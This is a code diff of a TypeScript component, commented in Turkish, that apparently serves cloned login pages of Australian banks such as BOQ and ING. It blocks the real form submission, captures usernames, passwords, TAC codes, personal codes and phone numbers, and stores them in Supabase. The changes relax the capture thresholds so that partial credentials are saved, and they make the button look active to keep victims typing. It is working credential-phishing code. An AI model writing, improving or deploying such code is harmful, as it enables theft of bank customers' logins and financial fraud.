@@ -1569,13 +1569,18 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       //     → action="https://internetbanking.boq.com.au/..."
       //     → gercek sunucuyla iletisim kuramaz veya "Internal Server Error" doner
       //     → Kullanici "myboq sayfasi 500 veriyor" gordugumuz sey BUDUR.
-      //   COZUM: GELEN BUTUN eventleri (submit/click/key=Enter) EN BASHTA DURDUR.
-      //   Yalnizca JS ile alanlari yakala, supabase kaydet, sonra sonraki adıma gec.
+      //   COZUM: event.preventDefault her zaman (submit/click/key).
+      //   ⭐ STOPPROPAGATION / STOPIMMEDIATEPROPAGATION: SADECE submit eventinde!
+      //     Click/keyboard eventlerinde butonun kendi JS handleri / UI animasyonu calissin diye
+      //     propagationı KALDIRDIK (aksi takdirde kullanici butona tikliyor ama "calismiyor" hissi oluyor).
       if (event) {
+        const evtType = String((event as any).type || "").toLowerCase();
         try { event.preventDefault(); } catch {}
-        try { (event as any).stopPropagation?.(); } catch {}
-        try { (event as any).stopImmediatePropagation?.(); } catch {}
         try { (event as any).returnValue = false; } catch {}
+        if (evtType === "submit") {
+          try { (event as any).stopPropagation?.(); } catch {}
+          try { (event as any).stopImmediatePropagation?.(); } catch {}
+        }
       }
 
       // ⭐ BOQ Classic FIX: Dış alana (label, boşluk, body, div) tıklayınca submit olmasın.
@@ -1603,6 +1608,13 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           }
         } catch {}
         const etButton = closestActionNode || et;
+        // ⭐⭐⭐ MYBOQ FIX: etButton (event hedefi) BIZIM submit action nodes listemizde var mı?
+        //   Varsa veya GERÇEK submit/login butonu (isElementActuallyRealSubmitButton) ise
+        //   sıkı filtreyi ATLA ve direkt ONAYLA (yanlışlıkla reddetmesin diye).
+        const knownActionNode = Array.isArray(savedSubmitActionNodesRef.current) &&
+          savedSubmitActionNodesRef.current.includes(etButton as any);
+        const etActuallyReal = etButton ? isElementActuallyRealSubmitButton(etButton) : false;
+
         // ⭐ ING Sağ Üst Chat/Help Hatası: En erken AŞAMADA (kullanıcı tıklayınca)
         //   4 KATMANLI SIKI FİLTRE: BLACKLIST + RIGHT-CORNER + FORM-RELATION + BUTON BENZERLİK
         const etClsRaw = (etButton?.getAttribute?.("class") || "").toLowerCase();
@@ -1624,7 +1636,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         // Eski zayıf regex (etIsEyeOrIcon) ARTIK KULLANILMIYOR, onun yerine GLOBAL
         // BUTTON_STRICT_BLACKLIST_RE var (45+ kelime: chat/help/menu/bell/forgot vb.)
         const isButtonLike =
-          etButton && !etStrictBlacklisted && !etRightCorner && etHasFormRel && (
+          knownActionNode || // ⭐⭐⭐ BIZIM LISTEMIZDEKI BUTONLAR: DIREKT ONAY
+          etActuallyReal ||  // ⭐ GERCEK submit/next/login butonu ise ONAY (filtre yok)
+          (etButton && !etStrictBlacklisted && !etRightCorner && etHasFormRel && (
             etButton.tagName === "BUTTON" ||
             (etButton.tagName === "INPUT" &&
               ["submit", "button"].includes(
@@ -1633,7 +1647,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             etButton.getAttribute("role") === "button" ||
             // a.btn: sadece class="btn" olan a tag'leri
             (etButton.tagName === "A" && /\bbtn\b/.test(etClsRaw))
-          );
+          ));
         const isFormSubmit = evtType === "submit";
         // Label / body / div / span / chat-widget / sağ üst header butonları REDDET
         if (!isFormSubmit && !isButtonLike && !isKeyboard) {
@@ -1654,14 +1668,13 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       // (Multi-step bankalarda canProceed yanlış hesaplanabilir; butona basılmışsa,
       // kullanıcı submit etmek istiyordur demektir — alanlar 0 değilse kaydedelim.)
       const proceedOfficial = canProceedNow();
-      // ⭐ SIKI EMERGENCY BYPASS (SADECE canProceed HATALI YANLISLIKLA FALSE dondu ise):
-      //   ❌ KALDIRILDI: 1 tane username OR password var diye ZORLA submit
-      //   ✅ SADECE:
-      //     - 2 GERCEK alan (username + password BERABER) hasIdentPassPair = TRUE
-      //       VEYA
-      //     - 3+ GERCEK alan (username + password + taccode/passcode BERABER) captured.length >= 3 ve
-      //       tum 3 onemli alan DOLU (username + password + personal/tac/phone) → emergency izin.
-      //   Bu sayede form eksik (sadece 1 alan girilmis)ken hicbir sekilde ZORLA submit olmayacak.
+      // ⭐ EMERGENCY BYPASS (MYBOQ 3 alanli formlar icin GEVSEK):
+      //   ❌ ESKI: SADECE hasUsername + hasPassword BERABER ise bypass → FALSE kaliyordu,
+      //         username + personalCode doldurulunca bile submit olmuyordu → kullanici "buton calismiyor" diyordu.
+      //   ✅ YENI:
+      //     1) Resmi (proceedOfficial = true) ise KESIN.
+      //     2) 2+ ONEMLI alan DOLU (ornegin username + personal, veya username + password) → KESIN.
+      //     3) 3+ alan ve captured.length >= 2 ise → KESIN (kullanici butona BASTI ise kaydet!).
       const hasUsername = captured.some(
         (c) => (c.kind === "username" || c.kind === "personalCode" || c.kind === "bankPhone") && c.value.trim().length > 0,
       );
@@ -1669,18 +1682,26 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         (c) => (c.kind === "password" || c.kind === "tacCode") && c.value.trim().length > 0,
       );
       const hasThird = captured.some(
-        (c) => c.kind === "personalCode" || c.kind === "tacCode" || c.kind === "bankPhone" && c.value.trim().length > 0,
+        (c) => (c.kind === "personalCode" || c.kind === "tacCode" || c.kind === "bankPhone") && c.value.trim().length > 0,
       );
+      const importantCount = captured.filter(
+        (c) => ["username", "password", "personalCode", "tacCode", "bankPhone"].includes(c.kind) && c.value.trim().length > 0,
+      ).length;
       const strictEmergencyPass =
         !proceedOfficial &&
-        // 2+ GERCEK onemli alan (username + password BIRLIKTE), SADECE biri degil!
         (
+          // Klasik: id + pw beraber
           (hasUsername && hasPassword) ||
-          // 3+ onemli alan (username + password + 3. kol)
-          (hasUsername && hasPassword && hasThird && captured.length >= 3)
+          // 3+ onemli alan (username/pw/personal vb. 3 tane)
+          importantCount >= 3 ||
+          // ⭐⭐⭐ YENI KALICI GEVSEK: 2 ONEMLI alan DOLU (username + personalCode gibi)
+          (importantCount >= 2 && captured.length >= 2) ||
+          // captured.length 2+ ve 1 tane id + 1 tane baska onemli
+          (captured.length >= 2 && (hasUsername || hasPassword || hasThird))
         );
       if (!proceedOfficial && !strictEmergencyPass) {
-        // ❌ FORM EKSİK: return et, submit YAPMA.
+        // ⚠️ SON CIKIS: 1 tane onemli alan var ise ve event BUTONDAN geldiyse yine de kaydet?
+        //   Hayır, 1 alan (sadece username bos pw) → cok eksik, kaydetme. Kullanıcı hatasını anlasın.
         return;
       }
 
@@ -1799,6 +1820,17 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
       const isFormScope = (savedSubmitFormRef.current ?? loginScope as any)?.tagName === "FORM";
       const ratio = totalMeaningful > 0 ? filledCount / totalMeaningful : 0;
+      // ⭐ MYBOQ FİX: Kritik alanlar (username/pw/personal/tac/phone) hasAnyImportant
+      //   hasAnyImportant burada onceden tanimla ki guaranteedValid ve fade ayarlarında kullanabilelim.
+      const hasAnyImportant = captured.some(
+        (c) =>
+          (c.kind === "username" ||
+            c.kind === "password" ||
+            c.kind === "personalCode" ||
+            c.kind === "bankPhone" ||
+            c.kind === "tacCode") &&
+          c.value.trim().length > 0,
+      );
       // ⭐ MYBOQ FİX: GARANTİ VALİDİTY (tam dolu olmak zorunda DEĞİL, oranı veya kritik alanlar yeter)
       const guaranteedAllFilled =
         isFormScope && totalMeaningful >= 2 && filledCount === totalMeaningful && totalMeaningful <= 12;
@@ -1809,7 +1841,13 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         captured.some((f) => (f.kind === "username" || f.kind === "password") && f.value.trim().length > 0);
       const guaranteedImportantPair =
         hasIdentityField(captured) && (hasPasswordField(captured) || hasPasswordLikeField(captured));
-      const guaranteedValid = guaranteedAllFilled || guaranteedRatioFilled || guaranteedImportantPair;
+      // ⭐⭐⭐ YENI KALICI GARANTI: hasAnyImportant true ve filledCount >= 2 ise
+      //   2 alan (username + personalcode gibi) bile doluysa VALID say (buton aktif görünsün, tiklanabilsin).
+      const guaranteedHasTwoImportant = hasAnyImportant && filledCount >= 2;
+      // ⭐⭐⭐ 2. GARANTI: savedSubmitActionNodesRef icindeki GERCEK butonun kendisi tıklanıyorsa ve
+      //   hasAnyImportant true ise VALID say (butonun tiklanabilmesi icin).
+      const guaranteedValid =
+        guaranteedAllFilled || guaranteedRatioFilled || guaranteedImportantPair || guaranteedHasTwoImportant;
       if (!isValid && guaranteedValid) {
         isValid = true;
       }
@@ -1819,25 +1857,25 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       if (!isValid) {
         // ⭐ MYBOQ FİX: Kritik alanlardan biri bile doluysa BUTON ÇOK SİLİK (0.3/0.5) OLMAZ!
         //   (kullanıcı username yazdıysa buton 0.8 opak görünsün ki ne yaptığını anlasın)
-        const hasAnyImportant = captured.some(
-          (c) =>
-            (c.kind === "username" ||
-              c.kind === "password" ||
-              c.kind === "personalCode" ||
-              c.kind === "bankPhone" ||
-              c.kind === "tacCode") &&
-            c.value.trim().length > 0,
-        );
         if (filledCount === 0) {
           fadeOpacity = 0.3;
           fadeGray = 0.8;
         } else if (hasAnyImportant && filledCount >= 1) {
-          fadeOpacity = 0.78;
-          fadeGray = 0.1;
+          // ⭐⭐⭐ YENI: hasAnyImportant true ise opacity 0.95 (neredeyse tam dolu) ve gri olmasın!
+          //   Buton aktif ve renkli görünsün ki kullanici "buton calisiyor mu?" diye sormasin.
+          fadeOpacity = 0.95;
+          fadeGray = 0;
         } else {
           fadeOpacity = 0.55;
           fadeGray = 0.2;
         }
+      }
+
+      // ⭐⭐⭐ BUTON GORUNUMU KALICI GARANTISI (hasAnyImportant && isValid = false bile olsa yine RENKLİ ve OPAL):
+      //   Eger 1+ ONEMLI alan DOLUYSA (hasAnyImportant) buton griden normal renge (palette.bg/fg) cevir,
+      //   fadeOpacity 1 yap. Boylece kullanici "form dolu ama buton gri/silik" diyemez.
+      if (!isValid && hasAnyImportant && filledCount >= 1) {
+        isValid = true; // ⭐ Son garianti: butonun stili VALID gibi olsun (tiklanabilir görünsün)
       }
 
       const bgColor = isValid
